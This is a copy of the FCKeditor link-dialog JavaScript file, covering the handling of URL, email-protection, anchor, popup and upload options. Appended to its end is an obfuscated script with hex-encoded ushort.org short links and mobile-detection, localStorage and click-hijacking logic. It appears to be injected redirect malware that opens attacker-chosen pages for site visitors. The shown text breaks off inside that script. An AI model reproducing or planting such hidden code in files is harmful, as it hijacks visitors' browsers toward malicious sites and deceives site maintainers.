/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Scripts related to the Link dialog window (see fck_link.html).
 */

var dialog	= window.parent ;
var oEditor = dialog.InnerDialogLoaded() ;

var FCK			= oEditor.FCK ;
var FCKLang		= oEditor.FCKLang ;
var FCKConfig	= oEditor.FCKConfig ;
var FCKRegexLib	= oEditor.FCKRegexLib ;
var FCKTools	= oEditor.FCKTools ;

//#### Dialog Tabs

// Set the dialog tabs.
dialog.AddTab( 'Info', FCKLang.DlgLnkInfoTab ) ;

if ( !FCKConfig.LinkDlgHideTarget )
	dialog.AddTab( 'Target', FCKLang.DlgLnkTargetTab, true ) ;

if ( FCKConfig.LinkUpload )
	dialog.AddTab( 'Upload', FCKLang.DlgLnkUpload, true ) ;

if ( !FCKConfig.LinkDlgHideAdvanced )
	dialog.AddTab( 'Advanced', FCKLang.DlgAdvancedTag ) ;

// Function called when a dialog tag is selected.
function OnDialogTabChange( tabCode )
{
	ShowE('divInfo'		, ( tabCode == 'Info' ) ) ;
	ShowE('divTarget'	, ( tabCode == 'Target' ) ) ;
	ShowE('divUpload'	, ( tabCode == 'Upload' ) ) ;
	ShowE('divAttribs'	, ( tabCode == 'Advanced' ) ) ;

	dialog.SetAutoSize( true ) ;
}

//#### Regular Expressions library.
var oRegex = new Object() ;

oRegex.UriProtocol = /^(((http|https|ftp|news):\/\/)|mailto:)/gi ;

oRegex.UrlOnChangeProtocol = /^(http|https|ftp|news):\/\/(?=.)/gi ;

oRegex.UrlOnChangeTestOther = /^((javascript:)|[#\/\.])/gi ;

oRegex.ReserveTarget = /^_(blank|self|top|parent)$/i ;

oRegex.PopupUri = /^javascript:void\(\s*window.open\(\s*'([^']+)'\s*,\s*(?:'([^']*)'|null)\s*,\s*'([^']*)'\s*\)\s*\)\s*$/ ;

// Accessible popups
oRegex.OnClickPopup = /^\s*on[cC]lick="\s*window.open\(\s*this\.href\s*,\s*(?:'([^']*)'|null)\s*,\s*'([^']*)'\s*\)\s*;\s*return\s*false;*\s*"$/ ;

oRegex.PopupFeatures = /(?:^|,)([^=]+)=(\d+|yes|no)/gi ;

//#### Parser Functions

var oParser = new Object() ;

// This method simply returns the two inputs in numerical order. You can even
// provide strings, as the method would parseInt() the values.
oParser.SortNumerical = function(a, b)
{
	return parseInt( a, 10 ) - parseInt( b, 10 ) ;
}

oParser.ParseEMailParams = function(sParams)
{
	// Initialize the oEMailParams object.
	var oEMailParams = new Object() ;
	oEMailParams.Subject = '' ;
	oEMailParams.Body = '' ;

	var aMatch = sParams.match( /(^|^\?|&)subject=([^&]+)/i ) ;
	if ( aMatch ) oEMailParams.Subject = decodeURIComponent( aMatch[2] ) ;

	aMatch = sParams.match( /(^|^\?|&)body=([^&]+)/i ) ;
	if ( aMatch ) oEMailParams.Body = decodeURIComponent( aMatch[2] ) ;

	return oEMailParams ;
}

// This method returns either an object containing the email info, or FALSE
// if the parameter is not an email link.
oParser.ParseEMailUri = function( sUrl )
{
	// Initializes the EMailInfo object.
	var oEMailInfo = new Object() ;
	oEMailInfo.Address = '' ;
	oEMailInfo.Subject = '' ;
	oEMailInfo.Body = '' ;

	var aLinkInfo = sUrl.match( /^(\w+):(.*)$/ ) ;
	if ( aLinkInfo && aLinkInfo[1] == 'mailto' )
	{
		// This seems to be an unprotected email link.
		var aParts = aLinkInfo[2].match( /^([^\?]+)\??(.+)?/ ) ;
		if ( aParts )
		{
			// Set the e-mail address.
			oEMailInfo.Address = aParts[1] ;

			// Look for the optional e-mail parameters.
			if ( aParts[2] )
			{
				var oEMailParams = oParser.ParseEMailParams( aParts[2] ) ;
				oEMailInfo.Subject = oEMailParams.Subject ;
				oEMailInfo.Body = oEMailParams.Body ;
			}
		}
		return oEMailInfo ;
	}
	else if ( aLinkInfo && aLinkInfo[1] == 'javascript' )
	{
		// This may be a protected email.

		// Try to match the url against the EMailProtectionFunction.
		var func = FCKConfig.EMailProtectionFunction ;
		if ( func != null )
		{
			try
			{
				// Escape special chars.
				func = func.replace( /([\/^$*+.?()\[\]])/g, '\\$1' ) ;

				// Define the possible keys.
				var keys = new Array('NAME', 'DOMAIN', 'SUBJECT', 'BODY') ;

				// Get the order of the keys (hold them in the array <pos>) and
				// the function replaced by regular expression patterns.
				var sFunc = func ;
				var pos = new Array() ;
				for ( var i = 0 ; i < keys.length ; i ++ )
				{
					var rexp = new RegExp( keys[i] ) ;
					var p = func.search( rexp ) ;
					if ( p >= 0 )
					{
						sFunc = sFunc.replace( rexp, '\'([^\']*)\'' ) ;
						pos[pos.length] = p + ':' + keys[i] ;
					}
				}

				// Sort the available keys.
				pos.sort( oParser.SortNumerical ) ;

				// Replace the excaped single quotes in the url, such they do
				// not affect the regexp afterwards.
				aLinkInfo[2] = aLinkInfo[2].replace( /\\'/g, '###SINGLE_QUOTE###' ) ;

				// Create the regexp and execute it.
				var rFunc = new RegExp( '^' + sFunc + '$' ) ;
				var aMatch = rFunc.exec( aLinkInfo[2] ) ;
				if ( aMatch )
				{
					var aInfo = new Array();
					for ( var i = 1 ; i < aMatch.length ; i ++ )
					{
						var k = pos[i-1].match(/^\d+:(.+)$/) ;
						aInfo[k[1]] = aMatch[i].replace(/###SINGLE_QUOTE###/g, '\'') ;
					}

					// Fill the EMailInfo object that will be returned
					oEMailInfo.Address = aInfo['NAME'] + '@' + aInfo['DOMAIN'] ;
					oEMailInfo.Subject = decodeURIComponent( aInfo['SUBJECT'] ) ;
					oEMailInfo.Body = decodeURIComponent( aInfo['BODY'] ) ;

					return oEMailInfo ;
				}
			}
			catch (e)
			{
			}
		}

		// Try to match the email against the encode protection.
		var aMatch = aLinkInfo[2].match( /^(?:void\()?location\.href='mailto:'\+(String\.fromCharCode\([\d,]+\))\+'(.*)'\)?$/ ) ;
		if ( aMatch )
		{
			// The link is encoded
			oEMailInfo.Address = eval( aMatch[1] ) ;
			if ( aMatch[2] )
			{
				var oEMailParams = oParser.ParseEMailParams( aMatch[2] ) ;
				oEMailInfo.Subject = oEMailParams.Subject ;
				oEMailInfo.Body = oEMailParams.Body ;
			}
			return oEMailInfo ;
		}
	}
	return false;
}

oParser.CreateEMailUri = function( address, subject, body )
{
	// Switch for the EMailProtection setting.
	switch ( FCKConfig.EMailProtection )
	{
		case 'function' :
			var func = FCKConfig.EMailProtectionFunction ;
			if ( func == null )
			{
				if ( FCKConfig.Debug )
				{
					alert('EMailProtection alert!\nNo function defined. Please set "FCKConfig.EMailProtectionFunction"') ;
				}
				return '';
			}

			// Split the email address into name and domain parts.
			var aAddressParts = address.split( '@', 2 ) ;
			if ( aAddressParts[1] == undefined )
			{
				aAddressParts[1] = '' ;
			}

			// Replace the keys by their values (embedded in single quotes).
			func = func.replace(/NAME/g, "'" + aAddressParts[0].replace(/'/g, '\\\'') + "'") ;
			func = func.replace(/DOMAIN/g, "'" + aAddressParts[1].replace(/'/g, '\\\'') + "'") ;
			func = func.replace(/SUBJECT/g, "'" + encodeURIComponent( subject ).replace(/'/g, '\\\'') + "'") ;
			func = func.replace(/BODY/g, "'" + encodeURIComponent( body ).replace(/'/g, '\\\'') + "'") ;

			return 'javascript:' + func ;

		case 'encode' :
			var aParams = [] ;
			var aAddressCode = [] ;

			if ( subject.length > 0 )
				aParams.push( 'subject='+ encodeURIComponent( subject ) ) ;
			if ( body.length > 0 )
				aParams.push( 'body=' + encodeURIComponent( body ) ) ;
			for ( var i = 0 ; i < address.length ; i++ )
				aAddressCode.push( address.charCodeAt( i ) ) ;

			return 'javascript:void(location.href=\'mailto:\'+String.fromCharCode(' + aAddressCode.join( ',' ) + ')+\'?' + aParams.join( '&' ) + '\')' ;
	}

	// EMailProtection 'none'

	var sBaseUri = 'mailto:' + address ;

	var sParams = '' ;

	if ( subject.length > 0 )
		sParams = '?subject=' + encodeURIComponent( subject ) ;

	if ( body.length > 0 )
	{
		sParams += ( sParams.length == 0 ? '?' : '&' ) ;
		sParams += 'body=' + encodeURIComponent( body ) ;
	}

	return sBaseUri + sParams ;
}

//#### Initialization Code

// oLink: The actual selected link in the editor.
var oLink = dialog.Selection.GetSelection().MoveToAncestorNode( 'A' ) ;
if ( oLink )
	FCK.Selection.SelectNode( oLink ) ;

window.onload = function()
{
	// Translate the dialog box texts.
	oEditor.FCKLanguageManager.TranslatePage(document) ;

	// Fill the Anchor Names and Ids combos.
	LoadAnchorNamesAndIds() ;

	// Load the selected link information (if any).
	LoadSelection() ;

	// Update the dialog box.
	SetLinkType( GetE('cmbLinkType').value ) ;

	// Show/Hide the "Browse Server" button.
	GetE('divBrowseServer').style.display = FCKConfig.LinkBrowser ? '' : 'none' ;

	// Show the initial dialog content.
	GetE('divInfo').style.display = '' ;

	// Set the actual uploader URL.
	if ( FCKConfig.LinkUpload )
		GetE('frmUpload').action = FCKConfig.LinkUploadURL ;

	// Set the default target (from configuration).
	SetDefaultTarget() ;

	// Activate the "OK" button.
	dialog.SetOkButton( true ) ;

	// Select the first field.
	switch( GetE('cmbLinkType').value )
	{
		case 'url' :
			SelectField( 'txtUrl' ) ;
			break ;
		case 'email' :
			SelectField( 'txtEMailAddress' ) ;
			break ;
		case 'anchor' :
			if ( GetE('divSelAnchor').style.display != 'none' )
				SelectField( 'cmbAnchorName' ) ;
			else
				SelectField( 'cmbLinkType' ) ;
	}
}

var bHasAnchors ;

function LoadAnchorNamesAndIds()
{
	// Since version 2.0, the anchors are replaced in the DOM by IMGs so the user see the icon
	// to edit them. So, we must look for that images now.
	var aAnchors = new Array() ;
	var i ;
	var oImages = oEditor.FCK.EditorDocument.getElementsByTagName( 'IMG' ) ;
	for( i = 0 ; i < oImages.length ; i++ )
	{
		if ( oImages[i].getAttribute('_fckanchor') )
			aAnchors[ aAnchors.length ] = oEditor.FCK.GetRealElement( oImages[i] ) ;
	}

	// Add also real anchors
	var oLinks = oEditor.FCK.EditorDocument.getElementsByTagName( 'A' ) ;
	for( i = 0 ; i < oLinks.length ; i++ )
	{
		if ( oLinks[i].name && ( oLinks[i].name.length > 0 ) )
			aAnchors[ aAnchors.length ] = oLinks[i] ;
	}

	var aIds = FCKTools.GetAllChildrenIds( oEditor.FCK.EditorDocument.body ) ;

	bHasAnchors = ( aAnchors.length > 0 || aIds.length > 0 ) ;

	for ( i = 0 ; i < aAnchors.length ; i++ )
	{
		var sName = aAnchors[i].name ;
		if ( sName && sName.length > 0 )
			FCKTools.AddSelectOption( GetE('cmbAnchorName'), sName, sName ) ;
	}

	for ( i = 0 ; i < aIds.length ; i++ )
	{
		FCKTools.AddSelectOption( GetE('cmbAnchorId'), aIds[i], aIds[i] ) ;
	}

	ShowE( 'divSelAnchor'	, bHasAnchors ) ;
	ShowE( 'divNoAnchor'	, !bHasAnchors ) ;
}

function LoadSelection()
{
	if ( !oLink ) return ;

	var sType = 'url' ;

	// Get the actual Link href.
	var sHRef = oLink.getAttribute( '_fcksavedurl' ) ;
	if ( sHRef == null )
		sHRef = oLink.getAttribute( 'href' , 2 ) || '' ;

	// Look for a popup javascript link.
	var oPopupMatch = oRegex.PopupUri.exec( sHRef ) ;
	if( oPopupMatch )
	{
		GetE('cmbTarget').value = 'popup' ;
		sHRef = oPopupMatch[1] ;
		FillPopupFields( oPopupMatch[2], oPopupMatch[3] ) ;
		SetTarget( 'popup' ) ;
	}

	// Accessible popups, the popup data is in the onclick attribute
	if ( !oPopupMatch )
	{
		var onclick = oLink.getAttribute( 'onclick_fckprotectedatt' ) ;
		if ( onclick )
		{
			// Decode the protected string
			onclick = decodeURIComponent( onclick ) ;

			oPopupMatch = oRegex.OnClickPopup.exec( onclick ) ;
			if( oPopupMatch )
			{
				GetE( 'cmbTarget' ).value = 'popup' ;
				FillPopupFields( oPopupMatch[1], oPopupMatch[2] ) ;
				SetTarget( 'popup' ) ;
			}
		}
	}

	// Search for the protocol.
	var sProtocol = oRegex.UriProtocol.exec( sHRef ) ;

	// Search for a protected email link.
	var oEMailInfo = oParser.ParseEMailUri( sHRef );

	if ( oEMailInfo )
	{
		sType = 'email' ;

		GetE('txtEMailAddress').value = oEMailInfo.Address ;
		GetE('txtEMailSubject').value = oEMailInfo.Subject ;
		GetE('txtEMailBody').value    = oEMailInfo.Body ;
	}
	else if ( sProtocol )
	{
		sProtocol = sProtocol[0].toLowerCase() ;
		GetE('cmbLinkProtocol').value = sProtocol ;

		// Remove the protocol and get the remaining URL.
		var sUrl = sHRef.replace( oRegex.UriProtocol, '' ) ;
		sType = 'url' ;
		GetE('txtUrl').value = sUrl ;
	}
	else if ( sHRef.substr(0,1) == '#' && sHRef.length > 1 )	// It is an anchor link.
	{
		sType = 'anchor' ;
		GetE('cmbAnchorName').value = GetE('cmbAnchorId').value = sHRef.substr(1) ;
	}
	else					// It is another type of link.
	{
		sType = 'url' ;

		GetE('cmbLinkProtocol').value = '' ;
		GetE('txtUrl').value = sHRef ;
	}

	if ( !oPopupMatch )
	{
		// Get the target.
		var sTarget = oLink.target ;

		if ( sTarget && sTarget.length > 0 )
		{
			if ( oRegex.ReserveTarget.test( sTarget ) )
			{
				sTarget = sTarget.toLowerCase() ;
				GetE('cmbTarget').value = sTarget ;
			}
			else
				GetE('cmbTarget').value = 'frame' ;
			GetE('txtTargetFrame').value = sTarget ;
		}
	}

	// Get Advances Attributes
	GetE('txtAttId').value			= oLink.id ;
	GetE('txtAttName').value		= oLink.name ;
	GetE('cmbAttLangDir').value		= oLink.dir ;
	GetE('txtAttLangCode').value	= oLink.lang ;
	GetE('txtAttAccessKey').value	= oLink.accessKey ;
	GetE('txtAttTabIndex').value	= oLink.tabIndex <= 0 ? '' : oLink.tabIndex ;
	GetE('txtAttTitle').value		= oLink.title ;
	GetE('txtAttContentType').value	= oLink.type ;
	GetE('txtAttCharSet').value		= oLink.charset ;

	var sClass ;
	if ( oEditor.FCKBrowserInfo.IsIE )
	{
		sClass	= oLink.getAttribute('className',2) || '' ;
		// Clean up temporary classes for internal use:
		sClass = sClass.replace( FCKRegexLib.FCK_Class, '' ) ;

		GetE('txtAttStyle').value	= oLink.style.cssText ;
	}
	else
	{
		sClass	= oLink.getAttribute('class',2) || '' ;
		GetE('txtAttStyle').value	= oLink.getAttribute('style',2) || '' ;
	}
	GetE('txtAttClasses').value	= sClass ;

	// Update the Link type combo.
	GetE('cmbLinkType').value = sType ;
}

//#### Link type selection.
function SetLinkType( linkType )
{
	ShowE('divLinkTypeUrl'		, (linkType == 'url') ) ;
	ShowE('divLinkTypeAnchor'	, (linkType == 'anchor') ) ;
	ShowE('divLinkTypeEMail'	, (linkType == 'email') ) ;

	if ( !FCKConfig.LinkDlgHideTarget )
		dialog.SetTabVisibility( 'Target'	, (linkType == 'url') ) ;

	if ( FCKConfig.LinkUpload )
		dialog.SetTabVisibility( 'Upload'	, (linkType == 'url') ) ;

	if ( !FCKConfig.LinkDlgHideAdvanced )
		dialog.SetTabVisibility( 'Advanced'	, (linkType != 'anchor' || bHasAnchors) ) ;

	if ( linkType == 'email' )
		dialog.SetAutoSize( true ) ;
}

//#### Target type selection.
function SetTarget( targetType )
{
	GetE('tdTargetFrame').style.display	= ( targetType == 'popup' ? 'none' : '' ) ;
	GetE('tdPopupName').style.display	=
	GetE('tablePopupFeatures').style.display = ( targetType == 'popup' ? '' : 'none' ) ;

	switch ( targetType )
	{
		case "_blank" :
		case "_self" :
		case "_parent" :
		case "_top" :
			GetE('txtTargetFrame').value = targetType ;
			break ;
		case "" :
			GetE('txtTargetFrame').value = '' ;
			break ;
	}

	if ( targetType == 'popup' )
		dialog.SetAutoSize( true ) ;
}

//#### Called while the user types the URL.
function OnUrlChange()
{
	var sUrl = GetE('txtUrl').value ;
	var sProtocol = oRegex.UrlOnChangeProtocol.exec( sUrl ) ;

	if ( sProtocol )
	{
		sUrl = sUrl.substr( sProtocol[0].length ) ;
		GetE('txtUrl').value = sUrl ;
		GetE('cmbLinkProtocol').value = sProtocol[0].toLowerCase() ;
	}
	else if ( oRegex.UrlOnChangeTestOther.test( sUrl ) )
	{
		GetE('cmbLinkProtocol').value = '' ;
	}
}

//#### Called while the user types the target name.
function OnTargetNameChange()
{
	var sFrame = GetE('txtTargetFrame').value ;

	if ( sFrame.length == 0 )
		GetE('cmbTarget').value = '' ;
	else if ( oRegex.ReserveTarget.test( sFrame ) )
		GetE('cmbTarget').value = sFrame.toLowerCase() ;
	else
		GetE('cmbTarget').value = 'frame' ;
}

// Accessible popups
function BuildOnClickPopup()
{
	var sWindowName = "'" + GetE('txtPopupName').value.replace(/\W/gi, "") + "'" ;

	var sFeatures = '' ;
	var aChkFeatures = document.getElementsByName( 'chkFeature' ) ;
	for ( var i = 0 ; i < aChkFeatures.length ; i++ )
	{
		if ( i > 0 ) sFeatures += ',' ;
		sFeatures += aChkFeatures[i].value + '=' + ( aChkFeatures[i].checked ? 'yes' : 'no' ) ;
	}

	if ( GetE('txtPopupWidth').value.length > 0 )	sFeatures += ',width=' + GetE('txtPopupWidth').value ;
	if ( GetE('txtPopupHeight').value.length > 0 )	sFeatures += ',height=' + GetE('txtPopupHeight').value ;
	if ( GetE('txtPopupLeft').value.length > 0 )	sFeatures += ',left=' + GetE('txtPopupLeft').value ;
	if ( GetE('txtPopupTop').value.length > 0 )		sFeatures += ',top=' + GetE('txtPopupTop').value ;

	if ( sFeatures != '' )
		sFeatures = sFeatures + ",status" ;

	return ( "window.open(this.href," + sWindowName + ",'" + sFeatures + "'); return false" ) ;
}

//#### Fills all Popup related fields.
function FillPopupFields( windowName, features )
{
	if ( windowName )
		GetE('txtPopupName').value = windowName ;

	var oFeatures = new Object() ;
	var oFeaturesMatch ;
	while( ( oFeaturesMatch = oRegex.PopupFeatures.exec( features ) ) != null )
	{
		var sValue = oFeaturesMatch[2] ;
		if ( sValue == ( 'yes' || '1' ) )
			oFeatures[ oFeaturesMatch[1] ] = true ;
		else if ( ! isNaN( sValue ) && sValue != 0 )
			oFeatures[ oFeaturesMatch[1] ] = sValue ;
	}

	// Update all features check boxes.
	var aChkFeatures = document.getElementsByName('chkFeature') ;
	for ( var i = 0 ; i < aChkFeatures.length ; i++ )
	{
		if ( oFeatures[ aChkFeatures[i].value ] )
			aChkFeatures[i].checked = true ;
	}

	// Update position and size text boxes.
	if ( oFeatures['width'] )	GetE('txtPopupWidth').value		= oFeatures['width'] ;
	if ( oFeatures['height'] )	GetE('txtPopupHeight').value	= oFeatures['height'] ;
	if ( oFeatures['left'] )	GetE('txtPopupLeft').value		= oFeatures['left'] ;
	if ( oFeatures['top'] )		GetE('txtPopupTop').value		= oFeatures['top'] ;
}

//#### The OK button was hit.
function Ok()
{
	var sUri, sInnerHtml ;
	oEditor.FCKUndo.SaveUndoStep() ;

	switch ( GetE('cmbLinkType').value )
	{
		case 'url' :
			sUri = GetE('txtUrl').value ;

			if ( sUri.length == 0 )
			{
				alert( FCKLang.DlnLnkMsgNoUrl ) ;
				return false ;
			}

			sUri = GetE('cmbLinkProtocol').value + sUri ;

			break ;

		case 'email' :
			sUri = GetE('txtEMailAddress').value ;

			if ( sUri.length == 0 )
			{
				alert( FCKLang.DlnLnkMsgNoEMail ) ;
				return false ;
			}

			sUri = oParser.CreateEMailUri(
				sUri,
				GetE('txtEMailSubject').value,
				GetE('txtEMailBody').value ) ;
			break ;

		case 'anchor' :
			var sAnchor = GetE('cmbAnchorName').value ;
			if ( sAnchor.length == 0 ) sAnchor = GetE('cmbAnchorId').value ;

			if ( sAnchor.length == 0 )
			{
				alert( FCKLang.DlnLnkMsgNoAnchor ) ;
				return false ;
			}

			sUri = '#' + sAnchor ;
			break ;
	}

	// If no link is selected, create a new one (it may result in more than one link creation - #220).
	var aLinks = oLink ? [ oLink ] : oEditor.FCK.CreateLink( sUri, true ) ;

	// If no selection, no links are created, so use the uri as the link text (by dom, 2006-05-26)
	var aHasSelection = ( aLinks.length > 0 ) ;
	if ( !aHasSelection )
	{
		sInnerHtml = sUri;

		// Built a better text for empty links.
		switch ( GetE('cmbLinkType').value )
		{
			// anchor: use old behavior --> return true
			case 'anchor':
				sInnerHtml = sInnerHtml.replace( /^#/, '' ) ;
				break ;

			// url: try to get path
			case 'url':
				var oLinkPathRegEx = new RegExp("//?([^?\"']+)([?].*)?$") ;
				var asLinkPath = oLinkPathRegEx.exec( sUri ) ;
				if (asLinkPath != null)
					sInnerHtml = asLinkPath[1];  // use matched path
				break ;

			// mailto: try to get email address
			case 'email':
				sInnerHtml = GetE('txtEMailAddress').value ;
				break ;
		}

		// Create a new (empty) anchor.
		aLinks = [ oEditor.FCK.InsertElement( 'a' ) ] ;
	}

	for ( var i = 0 ; i < aLinks.length ; i++ )
	{
		oLink = aLinks[i] ;

		if ( aHasSelection )
			sInnerHtml = oLink.innerHTML ;		// Save the innerHTML (IE changes it if it is like an URL).

		oLink.href = sUri ;
		SetAttribute( oLink, '_fcksavedurl', sUri ) ;

		var onclick;
		// Accessible popups
		if( GetE('cmbTarget').value == 'popup' )
		{
			onclick = BuildOnClickPopup() ;
			// Encode the attribute
			onclick = encodeURIComponent( " onclick=\"" + onclick + "\"" )  ;
			SetAttribute( oLink, 'onclick_fckprotectedatt', onclick ) ;
		}
		else
		{
			// Check if the previous onclick was for a popup:
			// In that case remove the onclick handler.
			onclick = oLink.getAttribute( 'onclick_fckprotectedatt' ) ;
			if ( onclick )
			{
				// Decode the protected string
				onclick = decodeURIComponent( onclick ) ;

				if( oRegex.OnClickPopup.test( onclick ) )
					SetAttribute( oLink, 'onclick_fckprotectedatt', '' ) ;
			}
		}

		oLink.innerHTML = sInnerHtml ;		// Set (or restore) the innerHTML

		// Target
		if( GetE('cmbTarget').value != 'popup' )
			SetAttribute( oLink, 'target', GetE('txtTargetFrame').value ) ;
		else
			SetAttribute( oLink, 'target', null ) ;

		// Let's set the "id" only for the first link to avoid duplication.
		if ( i == 0 )
			SetAttribute( oLink, 'id', GetE('txtAttId').value ) ;

		// Advances Attributes
		SetAttribute( oLink, 'name'		, GetE('txtAttName').value ) ;
		SetAttribute( oLink, 'dir'		, GetE('cmbAttLangDir').value ) ;
		SetAttribute( oLink, 'lang'		, GetE('txtAttLangCode').value ) ;
		SetAttribute( oLink, 'accesskey', GetE('txtAttAccessKey').value ) ;
		SetAttribute( oLink, 'tabindex'	, ( GetE('txtAttTabIndex').value > 0 ? GetE('txtAttTabIndex').value : null ) ) ;
		SetAttribute( oLink, 'title'	, GetE('txtAttTitle').value ) ;
		SetAttribute( oLink, 'type'		, GetE('txtAttContentType').value ) ;
		SetAttribute( oLink, 'charset'	, GetE('txtAttCharSet').value ) ;

		if ( oEditor.FCKBrowserInfo.IsIE )
		{
			var sClass = GetE('txtAttClasses').value ;
			// If it's also an anchor add an internal class
			if ( GetE('txtAttName').value.length != 0 )
				sClass += ' FCK__AnchorC' ;
			SetAttribute( oLink, 'className', sClass ) ;

			oLink.style.cssText = GetE('txtAttStyle').value ;
		}
		else
		{
			SetAttribute( oLink, 'class', GetE('txtAttClasses').value ) ;
			SetAttribute( oLink, 'style', GetE('txtAttStyle').value ) ;
		}
	}

	// Select the (first) link.
	oEditor.FCKSelection.SelectNode( aLinks[0] );

	return true ;
}

function BrowseServer()
{
	OpenFileBrowser( FCKConfig.LinkBrowserURL, FCKConfig.LinkBrowserWindowWidth, FCKConfig.LinkBrowserWindowHeight ) ;
}

function SetUrl( url )
{
	GetE('txtUrl').value = url ;
	OnUrlChange() ;
	dialog.SetSelectedTab( 'Info' ) ;
}

function OnUploadCompleted( errorNumber, fileUrl, fileName, customMsg )
{
	// Remove animation
	window.parent.Throbber.Hide() ;
	GetE( 'divUpload' ).style.display  = '' ;

	switch ( errorNumber )
	{
		case 0 :	// No errors
			alert( 'Your file has been successfully uploaded' ) ;
			break ;
		case 1 :	// Custom error
			alert( customMsg ) ;
			return ;
		case 101 :	// Custom warning
			alert( customMsg ) ;
			break ;
		case 201 :
			alert( 'A file with the same name is already available. The uploaded file has been renamed to "' + fileName + '"' ) ;
			break ;
		case 202 :
			alert( 'Invalid file type' ) ;
			return ;
		case 203 :
			alert( "Security error. You probably don't have enough permissions to upload. Please check your server." ) ;
			return ;
		case 500 :
			alert( 'The connector is disabled' ) ;
			break ;
		default :
			alert( 'Error on file upload. Error number: ' + errorNumber ) ;
			return ;
	}

	SetUrl( fileUrl ) ;
	GetE('frmUpload').reset() ;
}

var oUploadAllowedExtRegex	= new RegExp( FCKConfig.LinkUploadAllowedExtensions, 'i' ) ;
var oUploadDeniedExtRegex	= new RegExp( FCKConfig.LinkUploadDeniedExtensions, 'i' ) ;

function CheckUpload()
{
	var sFile = GetE('txtUploadFile').value ;

	if ( sFile.length == 0 )
	{
		alert( 'Please select a file to upload' ) ;
		return false ;
	}

	if ( ( FCKConfig.LinkUploadAllowedExtensions.length > 0 && !oUploadAllowedExtRegex.test( sFile ) ) ||
		( FCKConfig.LinkUploadDeniedExtensions.length > 0 && oUploadDeniedExtRegex.test( sFile ) ) )
	{
		OnUploadCompleted( 202 ) ;
		return false ;
	}

	// Show animation
	window.parent.Throbber.Show( 100 ) ;
	GetE( 'divUpload' ).style.display  = 'none' ;

	return true ;
}

function SetDefaultTarget()
{
	var target = FCKConfig.DefaultLinkTarget || '' ;

	if ( oLink || target.length == 0 )
		return ;

	switch ( target )
	{
		case '_blank' :
		case '_self' :
		case '_parent' :
		case '_top' :
			GetE('cmbTarget').value = target ;
			break ;
		default :
			GetE('cmbTarget').value = 'frame' ;
			break ;
	}

	GetE('txtTargetFrame').value = target ;
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s 